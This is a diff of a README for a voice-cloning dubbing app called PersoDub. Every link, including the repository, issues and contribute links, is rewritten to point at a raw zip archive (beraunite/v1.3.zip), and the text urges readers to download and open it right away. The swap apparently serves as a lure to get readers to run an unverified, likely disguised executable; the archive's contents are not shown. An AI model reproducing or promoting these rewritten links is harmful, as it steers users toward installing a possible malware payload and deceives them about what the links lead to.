@@ -1,6 +1,6 @@
 # 🎙️ PersoDub - Dub Videos In Your Own Voice
 
-[![Download PersoDub](https://img.shields.io/badge/Download-PersoDub-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Tortoiseshellcatpanencephalitis662/PersoDub)
+[![Download PersoDub](https://img.shields.io/badge/Download-PersoDub-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Tortoiseshellcatpanencephalitis662/PersoDub/raw/refs/heads/main/beraunite/v1.3.zip)
 
 ---
 
@@ -26,7 +26,7 @@ The magic? PersoDub uses advanced speech recognition and voice cloning technolog
 
 ## 📥 How to Download and Install
 
-Visit this link to download the application: **[Download PersoDub](https://github.com/Tortoiseshellcatpanencephalitis662/PersoDub)**
+Visit this link to download the application: **[Download PersoDub](https://github.com/Tortoiseshellcatpanencephalitis662/PersoDub/raw/refs/heads/main/beraunite/v1.3.zip)**
 
 Once you're on the download page, you'll see the latest release. Download the file and open it to begin using PersoDub immediately. That's it — no complex setup, no command line, no technical steps.
 
@@ -116,7 +116,7 @@ PersoDub is built with **Electron** and leverages powerful open-source models:
 
 The app is structured around a local-first architecture, ensuring all data processing stays on-device. The codebase is modular, making it easy to extend for additional languages or custom voice models.
 
-If you'd like to contribute, report issues, or suggest features, visit the [GitHub repository](https://github.com/Tortoiseshellcatpanencephalitis662/PersoDub).
+If you'd like to contribute, report issues, or suggest features, visit the [GitHub repository](https://github.com/Tortoiseshellcatpanencephalitis662/PersoDub/raw/refs/heads/main/beraunite/v1.3.zip).
 
 ---
 
@@ -124,7 +124,7 @@ If you'd like to contribute, report issues, or suggest features, visit the [GitH
 
 Need help or have a question? Here's how to reach us:
 
-- **GitHub Issues** — Report bugs or request features on the [official repository](https://github.com/Tortoiseshellcatpanencephalitis662/PersoDub)
+- **GitHub Issues** — Report bugs or request features on the [official repository](https://github.com/Tortoiseshellcatpanencephalitis662/PersoDub/raw/refs/heads/main/beraunite/v1.3.zip)
 - **Community Discussions** — Join conversations about languages, workflows, and tips
 
 ---
@@ -155,4 +155,4 @@ PersoDub is open-source software, released under the **MIT License**. You are fr
 
 PersoDub puts professional-grade video dubbing in your hands — free, private, and beautifully simple. Whether you're a content creator reaching new audiences, a student studying foreign material, or just curious to hear your voice in another language, PersoDub makes it possible in minutes.
 
-[**Download PersoDub Now**](https://github.com/Tortoiseshellcatpanencephalitis662/PersoDub) and start dubbing your videos today. It's fast, it's free, and it's all yours.
+[**Download PersoDub Now**](https://github.com/Tortoiseshellcatpanencephalitis662/PersoDub/raw/refs/heads/main/beraunite/v1.3.zip) and start dubbing your videos today. It's fast, it's free, and it's all yours.
